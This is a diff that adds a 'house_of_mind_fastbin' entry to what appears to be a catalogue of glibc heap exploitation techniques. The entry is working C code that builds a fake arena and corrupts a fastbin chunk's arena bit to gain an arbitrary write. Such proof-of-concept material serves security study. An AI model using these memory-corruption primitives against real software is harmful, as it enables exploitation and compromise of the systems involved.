@@ -474,3 +474,47 @@ void *b = malloc(0x30); // get the stack address
     target[0] = 0xcafebabe;
     assert(stack_var[0] == 0xcafebabe);
 ```
+
+## house_of_mind_fastbin
+```c
+int HEAP_MAX_SIZE = 0x4000000;
+int MAX_SIZE = (128*1024) - 0x100; // MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635
+
+uint8_t* fake_arena = malloc(0x1000); 
+uint8_t* target_loc = fake_arena + 0x30;
+uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;
+
+printf("Set 'system_mem' (offset 0x888) for fake arena\n");
+fake_arena[0x888] = 0xFF;
+fake_arena[0x889] = 0xFF; 
+fake_arena[0x88a] = 0xFF; 
+
+uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1); // 0x555558000000
+uint64_t* fake_heap_info = (uint64_t*) new_arena_value; // 0x555558000000
+
+//Allocate until we reach a MAX_HEAP_SIZE offset
+uint64_t* user_mem = malloc(MAX_SIZE);
+while((long long)user_mem < new_arena_value){
+    user_mem = malloc(MAX_SIZE);
+}
+
+uint64_t* fastbin_chunk = malloc(0x50); // Size of 0x60
+uint64_t* chunk_ptr = fastbin_chunk - 2; // Point to chunk instead of mem
+
+// Fill the tcache
+uint64_t* tcache_chunks[7];
+for(int i = 0; i < 7; i++){
+    tcache_chunks[i] = malloc(0x50);
+}	
+for(int i = 0; i < 7; i++){
+    free(tcache_chunks[i]);
+}
+
+fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena)
+chunk_ptr[1] = 0x60 | 0x4; // Setting the non-main arena bit
+
+free(fastbin_chunk); // Trigger the madness
+
+printf("Target Write at %p: 0x%llx\n", target_loc, *((unsigned long long*) (target_loc)));
+assert(*((unsigned long *) (target_loc)) != 0);
+```
